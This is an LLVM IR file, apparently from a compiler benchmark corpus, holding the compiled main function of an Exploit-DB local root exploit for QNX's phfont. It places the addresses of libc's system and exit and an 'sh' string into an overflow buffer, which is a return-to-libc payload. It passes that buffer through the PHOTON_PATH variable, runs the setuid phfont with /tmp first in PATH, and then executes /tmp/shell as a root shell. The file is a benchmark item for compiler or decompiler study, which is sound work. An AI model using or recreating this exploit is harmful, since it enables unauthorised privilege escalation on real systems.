; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32155.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32155.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"%s\0A\0A\00", align 1
@HEADER = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [12 x i8] c"PHOTON_PATH\00", align 1
@.str.5 = private unnamed_addr constant [63 x i8] c"PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin /usr/photon/bin/phfont\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"[-] now dropping into root shell...\0A\00", align 1
@FILENAME = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [25 x i8] c"error: cannot unlink %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"/tmp/shell\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [440 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i8*, i8** @HEADER, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* %10)
  %12 = call i32 (...) @createshell()
  %13 = call i32 @find_libc(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %13, i32* %6, align 4
  %14 = call i32 @find_libc(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  store i32 %14, i32* %7, align 4
  %15 = call i32 @find_string(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store i32 %15, i32* %8, align 4
  %16 = getelementptr inbounds [440 x i8], [440 x i8]* %9, i64 0, i64 0
  %17 = call i32 @memset(i8* %16, i32 235, i32 440)
  %18 = getelementptr inbounds [440 x i8], [440 x i8]* %9, i64 0, i64 0
  %19 = load i32, i32* @OFFSET, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  %22 = bitcast i32* %6 to i8*
  %23 = call i32 @memcpy(i8* %21, i8* %22, i32 4)
  %24 = getelementptr inbounds [440 x i8], [440 x i8]* %9, i64 0, i64 0
  %25 = load i32, i32* @OFFSET, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = getelementptr inbounds i8, i8* %27, i64 4
  %29 = bitcast i32* %7 to i8*
  %30 = call i32 @memcpy(i8* %28, i8* %29, i32 4)
  %31 = getelementptr inbounds [440 x i8], [440 x i8]* %9, i64 0, i64 0
  %32 = load i32, i32* @OFFSET, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = getelementptr inbounds i8, i8* %34, i64 8
  %36 = bitcast i32* %8 to i8*
  %37 = call i32 @memcpy(i8* %35, i8* %36, i32 4)
  %38 = getelementptr inbounds [440 x i8], [440 x i8]* %9, i64 0, i64 0
  %39 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %38, i32 0)
  %40 = call i32 @system(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.5, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  %42 = call i32 @sleep(i32 2)
  %43 = load i8*, i8** @FILENAME, align 8
  %44 = call i64 @unlink(i8* %43)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %49

46:                                               ; preds = %2
  %47 = load i8*, i8** @FILENAME, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i8* %47)
  br label %49

49:                                               ; preds = %46, %2
  %50 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @createshell(...) #1

declare dso_local i32 @find_libc(i8*) #1

declare dso_local i32 @find_string(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @unlink(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
